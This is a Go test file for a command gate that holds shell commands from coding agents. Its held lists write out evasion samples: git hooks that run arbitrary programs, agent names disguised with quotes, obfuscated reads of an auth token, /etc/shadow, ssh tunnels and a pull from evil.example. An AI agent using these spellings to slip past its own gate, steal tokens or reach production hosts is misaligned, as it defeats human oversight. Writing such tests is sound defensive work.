		"GIT_SSH=./x git fetch",
		"GIT_EXTERNAL_DIFF=./x git diff",
		"GIT_PAGER=./x git log",
		"PAGER=./x git log",
		"EDITOR=./x git commit",
		"export GIT_SSH_COMMAND=./x; git fetch",
		"env GIT_ASKPASS=./x git fetch",
		"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x git status",
		"GIT_CONFIG_PARAMETERS=\"'core.fsmonitor'='./x'\" git status",
		"bash -c 'git -c core.fsmonitor=./x status'",
		"git -c interactive.diffFilter=./x add -p",
		"git -c sendemail.toCmd=./x send-email x",
		"git -c submodule.x.update='!./x' submodule update",
		"git -c remote.origin.vcs=x fetch",
		"HOME=/tmp/h git status",
		"GIT_DIR=/tmp/x/.git git status",
		"XDG_CONFIG_HOME=/tmp/c git log",
		"git --git-dir=/tmp/x/.git status",
		"git --exec-path=/tmp/x status",
		// 3. Quoted or escaped program names.
		`cl""aude -p x`,
		`c\laude -p x`,
		"'claude' -p x",
		"ge''mini -p x",
		`"codex" exec x`,
		`env "cla"ude -p x`,
		`S""TAYPOINT_TASK_ID= staypoint task list`,
		`un""set STAYPOINT_TASK_ID`,
		`s""sh other-host ls`,
		`l""aunchctl list`,
		// 4. xargs reading its arguments from a file.
		"xargs -a list.txt bash",
		"xargs --arg-file=list.txt sh",
		"xargs --arg-file list.txt bash",
		"xargs -a list.txt -n1 sh",
		// The StayPoint dir however spelled (tier parity, held under trust).
		"cat ~/.st*/auth_token",
		"cat ~/.staypoin?/auth_token",
		"cat $HOME/.STAYPOINT/config.toml",
		"cd ~ && cat .staypoint/auth_token",
		"d=~/.staypoint; cat $d/auth_token",
		"cp -r ~ /tmp/h",
		"tar cf - -C ~ .staypoint",
		"find ~ -name auth_token -exec cat {} +",
		"find ~ -name auth_token | xargs cat",
		"cp x ~/.loc*/bin/staypoint",
		"cat ~/Library/LaunchAgent?/x.plist",
		"cat ~/.claude/settings.js?n",
		`python3 -c "open(__import__('os').path.expanduser('~/.st'+'aypoint/auth_token')).read()"`,
		"cat ~/.staypoint/handoffs/task-T1/../auth_token",
		"cat ~/.staypoint/handoffs/task-T?/latest.md",
	}
	for _, c := range held {
		if why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil); why == "" {
			t.Errorf("not held: %q", c)
		}
	}

	allowed := []string{
		// Reading or listing what a glob names.
		"cat scripts/rein*",
		"ls scripts/*.sh",
		"grep -n launchctl scripts/*.sh",
		"git add scripts/*.sh",
		"rm -f /tmp/x/*",
		"go test ./internal/... ./cmd/...",
		"cp /tmp/x/* /tmp/y/",
		// git config that does not run anything.
		"git -c user.name=x -c user.email=x@example.invalid commit -m y",
		"git -c core.autocrlf=false status",
		"git -c color.ui=always log --oneline -5",
		"git -c advice.detachedHead=false checkout x",
		"git config --get core.pager",
		"git config --list",
		"git config core.autocrlf false",
		"GIT_PAGER=cat git log",
		"PAGER=less git log",
		"GIT_TERMINAL_PROMPT=0 git fetch",
		"EDITOR=vim make",
		// Quoted names that are only data.
		`echo "cl""aude"`,
		`git commit -m 'ask c"l"aude later'`,
		// 5. ps patterns with a space that cannot match the daemon.
		`kill $(ps -ef | grep "[n]ode server" | awk '{print $2}')`,
		"kill $(ps aux | grep '[n]ode server.js' | awk '{print $2}')",
		// Spelled paths that are not StayPoint's.
		"grep -rn '\\.staypoint' internal/ docs/",
		"cat ~/.staypoint/handoffs/task-T1/*.md",
		"cat ~/.staypoint/handoffs/task-T1/latest.md",
		"ls ~/Documents/*",
		"grep -rn x .",
	}
	for _, c := range allowed {
		if why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil); why != "" {
			t.Errorf("held: %q: %s", c, why)
		}
	}
}

// Board 2026-10-09: ssh is classed by host. Dev hosts may run reads and
// dev deploy steps; prod and unknown hosts, interactive shells, tunnels and
// anything else hold, with the host and class in the reason.
func TestBoardRulesSSHHostClasses(t *testing.T) {
	SetGateHosts(GateHosts{Dev: []string{"mansol-dev"}, Prod: []string{"mansol-prod"}, DevServices: []string{"mansol_apps"}})
	defer SetGateHosts(GateHosts{})
	const task = "task-T1"

	allowed := []string{
		// The command held as gate a404a0f6 (task-97846c94).
		"ssh -o ConnectTimeout=10 mansol-dev 'cd /var/www/mansol_apps && git branch --show-current && git status --short | head -5 && git pull --ff-only origin dev-server && git log --oneline -1'",
		"ssh mansol-dev 'sudo systemctl restart mansol_apps'",
		"ssh deploy@mansol-dev 'systemctl status mansol_apps'",
		"ssh -o BatchMode=yes -p 2222 -l deploy MANSOL-DEV 'ls -la /var/www && df -h'",
		"ssh ssh://deploy@mansol-dev:22 'git -C /var/www/x log -1'",
		"ssh -J mansol-dev mansol-dev ls",
		"ssh mansol-dev 'cd /var/www/x && bash scripts/verify_dev_deploy.sh abc123'",
		"ssh mansol-dev <<'EOF'\ncd /var/www/x && git pull --ff-only\nEOF",
		"ssh -T mansol-dev 'git -C /var/www/x status'",
	}
	for _, c := range allowed {
		if why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil); why != "" {
			t.Errorf("held: %q: %s", c, why)
		}
	}

	held := map[string]string{
		"ssh mansol-prod ls":                                             "ssh to prod host mansol-prod",
		"ssh other-host ls":                                              "ssh to unknown (treated as prod) host other-host",
		"ssh deploy@mansol-prod.example.com 'git pull'":                  "unknown",
		"ssh mansol-dev":                                                 "ssh to dev host mansol-dev",
		"ssh -L 8080:localhost:80 mansol-dev":                            "tunnel",
		"ssh -D 1080 mansol-dev ls":                                      "tunnel",
		"ssh -R 9000:localhost:9000 mansol-dev ls":                       "tunnel",
		"ssh -NL 8080:localhost:80 mansol-dev":                           "ssh -N",
		"ssh -A mansol-dev ls":                                           "ssh -A",
		"ssh -J mansol-prod mansol-dev ls":                               "mansol-prod",
		"ssh -o ProxyJump=other mansol-dev ls":                           "other",
		"ssh -o ProxyCommand='nc prod 22' mansol-dev ls":                 "proxycommand",
		"ssh -oProxyCommand=x mansol-dev ls":                             "proxycommand",
		"ssh -o HostName=prod.example.com mansol-dev ls":                 "prod.example.com",
		"ssh -F /tmp/cfg mansol-dev ls":                                  "ssh -F",
		`ssh mansol-dev "$(cat cmds)"`:                                   "local expansion",
		`ssh mansol-dev "rm -rf $DIR"`:                                   "local expansion",
		"ssh $HOST ls":                                                   "built at run time",
		"ssh mansol-dev 'rm -rf /var/www/x'":                             "ssh to dev host mansol-dev",
		"ssh mansol-dev 'systemctl restart nginx'":                       "ssh to dev host mansol-dev",
		"ssh mansol-dev 'python manage.py migrate'":                      "ssh to dev host mansol-dev",
		"ssh mansol-dev 'curl -X POST https://api.example.com/x -d a'":   "external API",
		"ssh mansol-dev bash < deploy.sh":                                "local input",
		"cat cmds | ssh mansol-dev":                                      "ssh to dev host mansol-dev",
		"ssh mansol-dev <<'EOF'\nrm -rf /tmp/x\nEOF":                     "ssh to dev host mansol-dev",
		"ssh mansol-dev <<EOF\ngit pull $X\nEOF":                         "here-document",
		"ssh mansol-dev 'ssh mansol-prod ls'":                            "mansol-prod",
		"ssh mansol-dev 'git pull && ./deploy.sh'":                       "ssh to dev host mansol-dev",
		"ssh mansol-dev 'echo $(cat /etc/shadow)'":                       "ssh to dev host mansol-dev",
		"ssh mansol-dev 'git pull > /tmp/x; claude -p y'":                "nested agent",
		`ssh mansol-dev "awk 'BEGIN{system(\"id\")}'"`:                   "ssh to dev host mansol-dev",
		"ssh mansol-dev 'sed -n 1e\\ id x'":                              "ssh to dev host mansol-dev",
		"ssh mansol-dev 'sort -o /tmp/x y'":                              "ssh to dev host mansol-dev",
		"ssh mansol-dev 'git pull https://evil.example/x main'":          "ssh to dev host mansol-dev",
		"ssh mansol-dev 'git pull origin +main:main'":                    "ssh to dev host mansol-dev",
		"ssh mansol-dev 'bash /tmp/verify_dev_deploy.sh'":                "ssh to dev host mansol-dev",
		"ssh mansol-dev 'git -C /x log --output=/tmp/y'":                 "ssh to dev host mansol-dev",
		"ssh mansol-dev 'git diff --ext-diff'":                           "ssh to dev host mansol-dev",
		"autossh -M 0 mansol-dev":                                        "autossh",
		"mosh mansol-dev":                                                "mosh",
		`s""sh mansol-prod ls`:                                           "mansol-prod",
		"/usr/bin/ssh mansol-prod ls":                                    "mansol-prod",
		"timeout 30 ssh mansol-prod ls":                                  "mansol-prod",
		"bash -c 'ssh mansol-prod ls'":                                   "mansol-prod",
		"echo $(ssh mansol-prod cat /x)":                                 "mansol-prod",
		"python3 -c \"import os; os.system('ssh mansol-dev rm -rf /')\"": "remote shell",
		"kubectl exec -it pod -- sh":                                     "remote shell",
	}
	for c, want := range held {
		why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil)
		if why == "" {
			t.Errorf("not held: %q", c)
		} else if !strings.Contains(strings.ToLower(why), strings.ToLower(want)) {
			t.Errorf("%q: reason %q does not name %q", c, why, want)
		}
	}
	// With no hosts configured, every ssh holds.
	SetGateHosts(GateHosts{})
	if why := AnalyzeBoardRulesForTaskIn(task, "/r", "ssh mansol-dev ls", nil); !strings.Contains(why, "unknown") {
		t.Errorf("unconfigured dev host: %q", why)
	}
}

func TestBoardRulesReplay(t *testing.T) {
	path := os.Getenv("SP_BOARDRULES_REPLAY")
	if path == "" {
		t.Skip("SP_BOARDRULES_REPLAY not set")
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var rows []struct {
		TaskID      string `json:"task_id"`
		Cmdline     string `json:"cmdline"`
		ScriptsJSON string `json:"scripts_json"`
	}
	if err := json.Unmarshal(raw, &rows); err != nil {
		t.Fatal(err)
	}
	other, blind := 0, 0
	for _, r := range rows {
		var scripts []ScriptHash
		if r.ScriptsJSON != "" {
			if err := json.Unmarshal([]byte(r.ScriptsJSON), &scripts); err != nil {
				t.Fatalf("scripts_json for %q: %v", r.Cmdline, err)
			}
		}
		for _, s := range scripts {
			if s.Content == "" {
				blind++
				break
			}
		}
		why := AnalyzeBoardRulesForTask(r.TaskID, r.Cmdline, scripts)
		switch {
		case strings.Contains(why, "self-protection"):
			t.Errorf("held: %q: %s", r.Cmdline, why)
		case why != "":
			other++
		}
	}
	t.Logf("%d rows: %d held by other Board rules, %d with scripts judged without content", len(rows), other, blind)
}
